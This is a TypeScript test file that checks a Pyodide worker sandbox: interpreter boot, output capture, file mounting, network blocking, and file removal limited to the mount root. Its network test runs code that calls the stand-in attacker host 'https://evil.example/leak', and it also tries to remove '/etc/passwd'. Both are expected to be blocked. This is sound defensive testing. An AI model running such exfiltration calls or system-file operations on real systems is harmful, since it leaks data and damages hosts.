import { afterEach, describe, expect, it, vi } from "vitest";
import { bootstrapWorker } from "./pyodide.worker";
import { MOUNT_ROOT, type HostToWorker, type WorkerToHost } from "./protocol";

/**
 * The whole worker pipeline against the real vendored dist: the network gate,
 * the interpreter boot from static/pyodide/, code execution with output
 * capture, file mounting, and the network refusal — everything the browser
 * worker will do, driven from Node so it can run in the ordinary server test
 * project. This is the test that fails if the runtime files drift, the gate
 * springs a leak, or the interpreter stops booting.
 */

const INDEX_URL = `${import.meta.dirname}/static/pyodide/`.replace(
	"/src/lib/utils/execution/",
	"/"
);

interface FakeScope {
	location: { origin: string };
	postMessage: (message: WorkerToHost) => void;
	onmessage: ((event: MessageEvent<HostToWorker>) => void) | null;
	fetch: typeof fetch;
	sent: WorkerToHost[];
}

const rawNetwork = vi.hoisted(() =>
	vi.fn(async (_input: RequestInfo | URL, _init?: RequestInit) => {
		throw new Error("the raw network was reached");
	})
);

/**
 * In Node, Pyodide's `js` bridge reflects the process global scope, not the
 * fake worker scope — so the gate is installed on the real `fetch` here, the
 * same way installNetworkGate does it inside the worker. A blocked URL must
 * then reject with the gate's message, never reach the raw network (which
 * fails loudly), and never be excused by a DNS error.
 */
function gateProcessFetch(): void {
	const gated = ((input: RequestInfo | URL, init?: RequestInit) => {
		const url = new URL(
			input instanceof Request ? input.url : String(input),
			"http://runtime.test"
		);
		if (url.origin !== "http://runtime.test" || !url.pathname.startsWith("/pyodide/")) {
			return Promise.reject(new TypeError("blocked by the execution sandbox"));
		}
		return rawNetwork(input, init);
	}) as typeof fetch;
	vi.stubGlobal("fetch", gated);
}

afterEach(() => {
	vi.unstubAllGlobals();
	rawNetwork.mockClear();
});

function makeScope(): FakeScope {
	const sent: WorkerToHost[] = [];
	const scope: FakeScope = {
		location: { origin: "http://runtime.test" },
		postMessage: (message) => sent.push(message),
		onmessage: null,
		fetch: globalThis.fetch,
		sent,
	};
	bootstrapWorker(scope as unknown as Parameters<typeof bootstrapWorker>[0], {
		indexURL: INDEX_URL,
	});
	return scope;
}

function send(scope: FakeScope, message: HostToWorker): void {
	scope.onmessage?.({ data: message } as MessageEvent<HostToWorker>);
}

async function until(
	scope: FakeScope,
	matches: (message: WorkerToHost) => boolean,
	timeoutMs = 150_000
): Promise<WorkerToHost> {
	const deadline = Date.now() + timeoutMs;
	for (;;) {
		const found = scope.sent.find(matches);
		if (found) return found;
		if (Date.now() > deadline) throw new Error("the worker never answered");
		await new Promise((resolve) => setTimeout(resolve, 100));
	}
}

describe("pyodide worker pipeline (real dist)", () => {
	it(
		"boots, runs code, captures output, mounts files and refuses the network",
		async () => {
			gateProcessFetch();
			const scope = makeScope();

			send(scope, { type: "run", id: 1, code: "print('hello from python')\n6 * 7" });
			const first = (await until(scope, (m) => m.type === "result" && m.id === 1)) as Extract<
				WorkerToHost,
				{ type: "result" }
			>;
			expect(first.ok).toBe(true);
			expect(first.stdout).toContain("hello from python");
			expect(first.result).toBe("42");
			expect(scope.sent.some((m) => m.type === "ready")).toBe(true);

			// Files mount under /mnt/data and are readable by executed code.
			send(scope, {
				type: "loadFiles",
				id: 2,
				files: [{ name: "data.csv", data: "a,b\n1,2\n" }],
			});
			const loaded = (await until(scope, (m) => m.type === "filesLoaded" && m.id === 2)) as Extract<
				WorkerToHost,
				{ type: "filesLoaded" }
			> & { id: number };
			expect(loaded.written).toEqual([`${MOUNT_ROOT}/data.csv`]);
			send(scope, {
				type: "run",
				id: 3,
				code: `print(open('${MOUNT_ROOT}/data.csv').read().strip())`,
			});
			const readBack = (await until(scope, (m) => m.type === "result" && m.id === 3)) as Extract<
				WorkerToHost,
				{ type: "result" }
			>;
			expect(readBack.stdout).toContain("a,b");

			// The gate answers before the raw fetch: a cross-origin URL is dead.
			send(scope, {
				type: "run",
				id: 4,
				code: "import js\ntry:\n    await js.fetch('https://evil.example/leak')\n    print('FETCH-WORKED')\nexcept Exception:\n    print('FETCH-BLOCKED')",
			});
			const gated = (await until(scope, (m) => m.type === "result" && m.id === 4)) as Extract<
				WorkerToHost,
				{ type: "result" }
			>;
			expect(gated.ok).toBe(true);
			expect(gated.stdout).toContain("FETCH-BLOCKED");
			expect(gated.stdout).not.toContain("FETCH-WORKED");

			// Mounted files can be removed again, and only from the mount root.
			send(scope, { type: "removeFile", id: 5, path: `${MOUNT_ROOT}/data.csv` });
			const removed = (await until(
				scope,
				(m) => m.type === "fileRemoved" && m.id === 5
			)) as Extract<WorkerToHost, { type: "fileRemoved" }> & { id: number };
			expect(removed.error).toBeUndefined();
			send(scope, { type: "removeFile", id: 6, path: "/etc/passwd" });
			const refused = (await until(
				scope,
				(m) => m.type === "fileRemoved" && m.id === 6
			)) as Extract<WorkerToHost, { type: "fileRemoved" }> & { id: number };
			expect(refused.error).toBeDefined();
		},
		{ timeout: 180_000 }
	);
});
